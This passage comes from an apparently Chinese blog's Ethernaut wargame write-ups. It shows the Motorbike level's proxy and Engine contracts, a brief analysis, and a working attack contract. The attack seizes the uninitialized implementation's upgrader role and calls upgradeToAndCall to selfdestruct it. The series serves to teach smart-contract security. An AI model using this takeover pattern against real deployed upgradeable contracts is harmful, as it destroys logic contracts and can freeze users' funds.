punctuation\">.</span><span class=\"token function\">delegatecall</span><span class=\"token punctuation\">(</span>\n            abi<span class=\"token punctuation\">.</span><span class=\"token function\">encodeWithSignature</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"initialize()\"</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>success<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Call failed\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">// Delegates the current call to `implementation`.</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">_delegate</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> implementation<span class=\"token punctuation\">)</span> <span class=\"token keyword\">internal</span> virtual <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token comment\">// solhint-disable-next-line no-inline-assembly</span>\n        <span class=\"token keyword\">assembly</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token function\">calldatacopy</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token function\">calldatasize</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">let</span> result <span class=\"token operator\">:=</span> <span class=\"token function\">delegatecall</span><span class=\"token punctuation\">(</span><span class=\"token function\">gas</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> implementation<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token function\">calldatasize</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n            <span class=\"token function\">returndatacopy</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token function\">returndatasize</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">switch</span> result\n            <span class=\"token keyword\">case</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token keyword\">revert</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token function\">returndatasize</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#125;</span>\n            <span class=\"token keyword\">default</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token keyword\">return</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token function\">returndatasize</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">// Fallback function that delegates calls to the address returned by `_implementation()`. </span>\n    <span class=\"token comment\">// Will run if no other function in the contract matches the call data</span>\n    fallback <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">payable</span> virtual <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">_delegate</span><span class=\"token punctuation\">(</span><span class=\"token function\">_getAddressSlot</span><span class=\"token punctuation\">(</span>_IMPLEMENTATION_SLOT<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">// Returns an `AddressSlot` with member `value` located at `slot`.</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">_getAddressSlot</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes32</span> slot<span class=\"token punctuation\">)</span> <span class=\"token keyword\">internal</span> <span class=\"token keyword\">pure</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span>AddressSlot <span class=\"token keyword\">storage</span> r<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">assembly</span> <span class=\"token punctuation\">&#123;</span>\n            r_slot <span class=\"token operator\">:=</span> slot\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">Engine</span> <span class=\"token keyword\">is</span> Initializable <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token comment\">// keccak-256 hash of \"eip1967.proxy.implementation\" subtracted by 1</span>\n    <span class=\"token builtin\">bytes32</span> <span class=\"token keyword\">internal</span> <span class=\"token keyword\">constant</span> _IMPLEMENTATION_SLOT <span class=\"token operator\">=</span> <span class=\"token number\">0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token builtin\">address</span> <span class=\"token keyword\">public</span> upgrader<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">uint256</span> <span class=\"token keyword\">public</span> horsePower<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">struct</span> <span class=\"token class-name\">AddressSlot</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token builtin\">address</span> value<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">initialize</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> initializer <span class=\"token punctuation\">&#123;</span>\n        horsePower <span class=\"token operator\">=</span> <span class=\"token number\">1000</span><span class=\"token punctuation\">;</span>\n        upgrader <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">// Upgrade the implementation of the proxy to `newImplementation`</span>\n    <span class=\"token comment\">// subsequently execute the function call</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">upgradeToAndCall</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> newImplementation<span class=\"token punctuation\">,</span> <span class=\"token builtin\">bytes</span> <span class=\"token keyword\">memory</span> data<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">_authorizeUpgrade</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">_upgradeToAndCall</span><span class=\"token punctuation\">(</span>newImplementation<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">// Restrict to upgrader role</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">_authorizeUpgrade</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">internal</span> <span class=\"token keyword\">view</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender <span class=\"token operator\">==</span> upgrader<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Can't upgrade\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">// Perform implementation upgrade with security checks for UUPS proxies, and additional setup call.</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">_upgradeToAndCall</span><span class=\"token punctuation\">(</span>\n        <span class=\"token builtin\">address</span> newImplementation<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">bytes</span> <span class=\"token keyword\">memory</span> data\n    <span class=\"token punctuation\">)</span> <span class=\"token keyword\">internal</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token comment\">// Initial upgrade and setup call</span>\n        <span class=\"token function\">_setImplementation</span><span class=\"token punctuation\">(</span>newImplementation<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>length <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span> success<span class=\"token punctuation\">,</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> newImplementation<span class=\"token punctuation\">.</span><span class=\"token function\">delegatecall</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>success<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Call failed\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    \n    <span class=\"token comment\">// Stores a new address in the EIP1967 implementation slot.</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">_setImplementation</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> newImplementation<span class=\"token punctuation\">)</span> <span class=\"token keyword\">private</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>Address<span class=\"token punctuation\">.</span><span class=\"token function\">isContract</span><span class=\"token punctuation\">(</span>newImplementation<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"ERC1967: new implementation is not a contract\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        \n        AddressSlot <span class=\"token keyword\">storage</span> r<span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">assembly</span> <span class=\"token punctuation\">&#123;</span>\n            r_slot <span class=\"token operator\">:=</span> _IMPLEMENTATION_SLOT\n        <span class=\"token punctuation\">&#125;</span>\n        r<span class=\"token punctuation\">.</span>value <span class=\"token operator\">=</span> newImplementation<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"Analyze-23\"><a href=\"#Analyze-23\" class=\"headerlink\" title=\"Analyze\"></a>Analyze</h2><p>题目要求使用selfdestruct方法回调engine，尝试过在proxy中更新逻辑合约地址，但由于engine内的初始化函数在关卡创建时候已经被调用，upgrader变量不能再被更改，尝试了直接更改存储address的slot，但是逻辑合约中的一切可以修改对应参数的函数均被限制，modifer或internal以及private</p>\n<p>最终检查逻辑和月中初始化函数并没有被调用过，可以自行调用使逻辑合约的upgrader变成攻击合约，从而调用upgradeandcall函数，调用其中的selfdestruct函数毁掉引擎</p>\n<h2 id=\"Attack-21\"><a href=\"#Attack-21\" class=\"headerlink\" title=\"Attack\"></a>Attack</h2><pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">contract</span> <span class=\"token class-name\">attack</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token builtin\">address</span> <span class=\"token keyword\">public</span> tar<span class=\"token operator\">=</span><span class=\"token number\">0xeEA18Bb1788a7C81488Cbd89A75C7e4DF86dBb89</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token keyword\">public</span><span class=\"token punctuation\">&#123;</span>\n        tar<span class=\"token punctuation\">.</span><span class=\"token function\">call</span><span class=\"token punctuation\">(</span>abi<span class=\"token punctuation\">.</span><span class=\"token function\">encodeWithSignature</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"initialize()\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    pwncon <span class=\"token keyword\">public</span> pwnaddr<span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">pwncon</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">bytes4</span> <span class=\"token keyword\">public</span> selecet<span class=\"token operator\">=</span>pwnaddr<span class=\"token punctuation\">.</span>des<span class=\"token punctuation\">.</span>selector<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">upandcall</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> a<span class=\"token punctuation\">,</span><span class=\"token builtin\">bytes</span> <span class=\"token keyword\">calldata</span> data<span class=\"token punctuation\">)</span><span class=\"token keyword\">public</span><span class=\"token punctuation\">&#123;</span>\n        tar<span class=\"token punctuation\">.</span><span class=\"token function\">call</span><span class=\"token punctuation\">(</span>abi<span class=\"token punctuation\">.</span><span class=\"token function\">encodeWithSignature</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"upgradeToAndCall(address,bytes)\"</span><span class=\"token punctuation\">,</span>a<span class=\"token punctuation\">,</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">pwncon</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">des</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token keyword\">external</span> <span class=\"token keyword\">payable</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">selfdestruct</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">payable</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n","text":" 地址https://ethernaut.openzeppelin.com/ 1.fallback 题目要求：获得合约所有权并将余额变成0 Codepragma solidity ^0.6.0; import '@openzeppelin/contracts/math/SafeM...","link":"","photos":[],"count_time":{"symbolsCount":"66k","symbolsTime":"1:01"},"categories":[],"tags":[{"name":"区块链","slug":"区块链","count":17,"path":"api/tags/区块链.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#1-fallback\"><span class=\"toc-text\">1.fallback</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Code\"><span class=\"toc-text\">Code</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Analyze\"><span class=\"toc-text\">Analyze</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Attack\"><span class=\"toc-text\">Attack</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#2-fallout\"><span class=\"toc-text\">2.fallout</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Code-1\"><span class=\"toc-text\">Code</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Analyze-1\"><span class=\"toc-text\">Analyze</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Attack-1\"><span class=\"toc-text\">Attack</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#2-coin-flip\"><span class=\"toc-text\">2.coin flip</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Code-2\"><span class=\"toc-text\">Code</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Analyze-2\"><span class=\"toc-text\">Analyze</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Attack-2\"><span class=\"toc-text\">Attack</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#4-Telephone\"><span class=\"toc-text\">4.Telephone</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Code-3\"><span class=\"toc-text\">Code</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Analyze-3\"><span class=\"toc-text\">Analyze</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Attack-3\"><span class=\"toc-text\">Attack</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#5-Token\"><span class=\"toc-text\">5.Token</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Code-4\"><span class=\"toc-text\">Code</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Analyze-4\"><span class=\"toc-text\">Analyze</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Attack-4\"><span class=\"toc-text\">Attack</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#6-Vault\"><span class=\"toc-text\">6.Vault</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Code-5\"><span class=\"toc-text\">Code</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Analyze-5\"><span class=\"toc-text\">Analyze</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Attack-5\"><span class=\"toc-text\">Attack</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#7-Delegation\"><span class=\"toc-text\">7.Delegation</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Code-6\"><span class=\"toc-text\">Code</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Analyze-6\"><span class=\"toc-text\">Analyze</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Attack-6\"><span class=\"toc-text\">Attack</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#8-Force\"><span class=\"toc-text\">8.Force</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Code-7\"><span class=\"toc-text\">Code</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Analyze-7\"><span class=\"toc-text\">Analyze</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Attack-7\"><span class=\"toc-text\">Attack</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#9-King\"><span class=\"toc-text\">9.King</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Code-8\"><span class=\"toc-text\">Code</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Analyze-8\"><span class=\"toc-text\">Analyze</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Attack-8\"><span class=\"toc-text\">Attack</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#10-Re-entrancy\"><span class=\"toc-text\">10.Re-entrancy</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Code-9\"><span class=\"toc-text\">Code</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Analyze-9\"><span class=\"toc-text\">Analyze</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Attack-9\"><span class=\"toc-text\">Attack</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#11-Elevator\"><span class=\"toc-text\">11.Elevator</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Code-10\"><span class=\"toc-text\">Code</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Analyze-10\"><span class=\"toc-text\">Analyze</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Attack-10\"><span class=\"toc-text\">Attack</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#12-Privacy\"><span class=\"toc-text\">12.Privacy</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Code-11\"><span class=\"toc-text\">Code</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Analyze-11\"><span class=\"toc-text\">Analyze</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Attack-11\"><span class=\"toc-text\">Attack</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#13-Gatekeeper-One\"><span class=\"toc-text\">13.Gatekeeper One</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Code-12\"><span class=\"toc-text\">Code</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#analyze\"><span class=\"toc-text\">analyze</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#14-Gatekeeper-Two\"><span class=\"toc-text\">14.Gatekeeper Two</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Code-13\"><span class=\"toc-text\">Code</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Analyze-12\"><span class=\"toc-text\">Analyze</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Attack-12\"><span class=\"toc-text\">Attack</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#15-Naught-Coin\"><span class=\"toc-text\">15.Naught Coin</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Code-14\"><span class=\"toc-text\">Code</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Analyze-13\"><span class=\"toc-text\">Analyze</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Attack-13\"><span class=\"toc-text\">Attack</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#16-Preservation\"><span class=\"toc-text\">16.Preservation</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Code-15\"><span class=\"toc-text\">Code</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Analyze-14\"><span class=\"toc-text\">Analyze</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Attzck\"><span class=\"toc-text\">Attzck</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#17-Recovery\"><span class=\"toc-text\">17.Recovery</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Code-16\"><span class=\"toc-text\">Code</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Analyze-15\"><span class=\"toc-text\">Analyze</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Attack-14\"><span class=\"toc-text\">Attack</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#18-MagicNumber\"><span class=\"toc-text\">18.MagicNumber</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Code-17\"><span class=\"toc-text\">Code</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Analyze-16\"><span class=\"toc-text\">Analyze</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Attack-15\"><span class=\"toc-text\">Attack</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#19-Alien-Codex\"><span class=\"toc-text\">19.Alien Codex</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Code-18\"><span class=\"toc-text\">Code</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Analyze-17\"><span class=\"toc-text\">Analyze</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Attack-16\"><span class=\"toc-text\">Attack</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#20-Denial\"><span class=\"toc-text\">20.Denial</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Code-19\"><span class=\"toc-text\">Code</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Analyze-18\"><span class=\"toc-text\">Analyze</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Attack-17\"><span class=\"toc-text\">Attack</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#21-Shop\"><span class=\"toc-text\">21.Shop</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Code-20\"><span class=\"toc-text\">Code</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Analyze-19\"><span class=\"toc-text\">Analyze</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Attack-18\"><span class=\"toc-text\">Attack</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#22-Dex\"><span class=\"toc-text\">22.Dex</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Code-21\"><span class=\"toc-text\">Code</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Analyze-20\"><span class=\"toc-text\">Analyze</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#23-Dex-Two\"><span class=\"toc-text\">23.Dex Two</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Code-22\"><span class=\"toc-text\">Code</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Analyze-21\"><span class=\"toc-text\">Analyze</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Attack-19\"><span class=\"toc-text\">Attack</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#24-Puzzle-Wallet\"><span class=\"toc-text\">24.Puzzle Wallet</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Code-23\"><span class=\"toc-text\">Code</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Analyze-22\"><span class=\"toc-text\">Analyze</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Attack-20\"><span class=\"toc-text\">Attack</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#25-Motorbike\"><span class=\"toc-text\">25.Motorbike</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Code-24\"><span class=\"toc-text\">Code</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Analyze-23\"><span class=\"toc-text\">Analyze</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Attack-21\"><span class=\"toc-text\">Attack</span></a></li></ol></li></ol>","author":{"name":"bcYng","slug":"blog-author","avatar":"https://cdn.jsdelivr.net/gh/bcYng-image/image/img/296321666270692_.pic.jpg","link":"/","description":"A rookie focused on blockchain security","socials":{"github":"https://github.com/bcYng-w","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"Defi Hack","uid":"68b9de7ae4d5b3763a05a9fb9f649b30","slug":"Defi Hack","date":"2022-08-02T02:46:57.436Z","updated":"2022-08-02T02:46:57.436Z","comments":true,"path":"api/articles/Defi Hack.json","keywords":null,"cover":[],"text":" 